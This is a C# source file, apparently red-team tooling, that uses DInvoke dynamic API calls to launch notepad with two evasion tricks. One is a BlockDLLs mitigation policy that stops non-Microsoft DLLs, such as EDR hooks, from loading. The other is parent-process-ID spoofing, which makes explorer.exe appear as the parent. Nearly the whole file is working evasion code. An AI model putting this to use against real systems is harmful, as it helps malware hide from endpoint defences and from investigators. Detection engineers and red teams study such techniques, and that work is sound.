using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

using DInvoke.DynamicInvoke;

namespace ConsoleApp1
{
    class Program
    {
        static void Mapping(string[] args)
        {
            var si = new Win32.STARTUPINFOEX();
            si.StartupInfo.cb = (uint)Marshal.SizeOf(si);
            si.StartupInfo.dwFlags = 0x00000001;

            var lpValue = Marshal.AllocHGlobal(IntPtr.Size);

            try
            {
                var funcParams = new object[] {
                    IntPtr.Zero,
                    2,
                    0,
                    IntPtr.Zero
                };

                Generic.DynamicAPIInvoke(
                    "kernel32.dll",
                    "InitializeProcThreadAttributeList",
                    typeof(InitializeProcThreadAttributeList),
                    ref funcParams,
                    true);

                var lpSize = (IntPtr)funcParams[3];
                si.lpAttributeList = Marshal.AllocHGlobal(lpSize);

                funcParams[0] = si.lpAttributeList;

                Generic.DynamicAPIInvoke(
                    "kernel32.dll",
                    "InitializeProcThreadAttributeList",
                    typeof(InitializeProcThreadAttributeList),
                    ref funcParams,
                    true);

                // BlockDLLs
                if (Is64Bit)
                {
                    Marshal.WriteIntPtr(lpValue, new IntPtr((long)Win32.BinarySignaturePolicy.BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON));
                }
                else
                {
                    Marshal.WriteIntPtr(lpValue, new IntPtr(unchecked((uint)Win32.BinarySignaturePolicy.BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON)));
                }

                funcParams = new object[]
                {
                    si.lpAttributeList,
                    (uint)0,
                    (IntPtr)Win32.ProcThreadAttribute.MITIGATION_POLICY,
                    lpValue,
                    (IntPtr)IntPtr.Size,
                    IntPtr.Zero,
                    IntPtr.Zero
                };

                Generic.DynamicAPIInvoke(
                    "kernel32.dll",
                    "UpdateProcThreadAttribute",
                    typeof(UpdateProcThreadAttribute),
                    ref funcParams,
                    true);

                // PPID Spoof
                var hParent = Process.GetProcessesByName("explorer")[0].Handle;
                lpValue = Marshal.AllocHGlobal(IntPtr.Size);
                Marshal.WriteIntPtr(lpValue, hParent);

                // Start Process
                funcParams = new object[]
                {
                    si.lpAttributeList,
                    (uint)0,
                    (IntPtr)Win32.ProcThreadAttribute.PARENT_PROCESS,
                    lpValue,
                    (IntPtr)IntPtr.Size,
                    IntPtr.Zero,
                    IntPtr.Zero
                };

                Generic.DynamicAPIInvoke(
                    "kernel32.dll",
                    "UpdateProcThreadAttribute",
                    typeof(UpdateProcThreadAttribute),
                    ref funcParams,
                    true);

                var pa = new Win32.SECURITY_ATTRIBUTES();
                var ta = new Win32.SECURITY_ATTRIBUTES();
                pa.nLength = Marshal.SizeOf(pa);
                ta.nLength = Marshal.SizeOf(ta);

                funcParams = new object[]
                {
                    null,
                    "notepad",
                    pa,
                    ta,
                    false,
                    Win32.CreationFlags.EXTENDED_STARTUPINFO_PRESENT,
                    IntPtr.Zero,
                    "C:\\Windows\\System32",
                    si,
                    null
                };

                Generic.DynamicAPIInvoke(
                    "kernel32.dll",
                    "CreateProcessA",
                    typeof(CreateProcess),
                    ref funcParams,
                    true);

                var pi = (Win32.PROCESS_INFORMATION)funcParams[9];

                if (pi.hProcess != IntPtr.Zero)
                {
                    Console.WriteLine($"Process ID: {pi.dwProcessId}");
                }

            }
            catch (Exception e)
            {
                Console.Error.WriteLine(e.Message);
            }
            finally
            {
                // Clean up
                var funcParams = new object[]
                {
                    si.lpAttributeList
                };

                Generic.DynamicAPIInvoke(
                    "kernel32.dll",
                    "DeleteProcThreadAttributeList",
                    typeof(DeleteProcThreadAttributeList),
                    ref funcParams,
                    true);

                Marshal.FreeHGlobal(si.lpAttributeList);
                Marshal.FreeHGlobal(lpValue);
            }

        }

        static bool Is64Bit
        {
            get
            {
                return IntPtr.Size == 8;
            }
        }

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate bool InitializeProcThreadAttributeList(
            IntPtr lpAttributeList,
            int dwAttributeCount,
            int dwFlags,
            ref IntPtr lpSize);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate bool UpdateProcThreadAttribute(
            IntPtr lpAttributeList,
            uint dwFlags,
            IntPtr Attribute,
            IntPtr lpValue,
            IntPtr cbSize,
            IntPtr lpPreviousValue,
            IntPtr lpReturnSize);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            ref Win32.SECURITY_ATTRIBUTES lpProcessAttributes,
            ref Win32.SECURITY_ATTRIBUTES lpThreadAttributes,
            bool bInheritHandles,
            Win32.CreationFlags dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref Win32.STARTUPINFOEX lpStartupInfo,
            out Win32.PROCESS_INFORMATION lpProcessInformation);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate bool DeleteProcThreadAttributeList(
            IntPtr lpAttributeList);
    }

    class Win32
    {
        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFO
        {
            public uint cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttributes;
            public uint dwFlags;
            public ushort wShowWindow;
            public ushort cbReserved;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdErr;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFOEX
        {
            public STARTUPINFO StartupInfo;
            public IntPtr lpAttributeList;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            public int bInheritHandle;
        }

        [Flags]
        public enum ProcThreadAttribute : int
        {
            MITIGATION_POLICY = 0x20007,
            PARENT_PROCESS = 0x00020000
        }

        [Flags]
        public enum BinarySignaturePolicy : ulong
        {
            BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x100000000000,
        }

        [Flags]
        public enum CreationFlags : uint
        {
            EXTENDED_STARTUPINFO_PRESENT = 0x00080000
        }
    }
}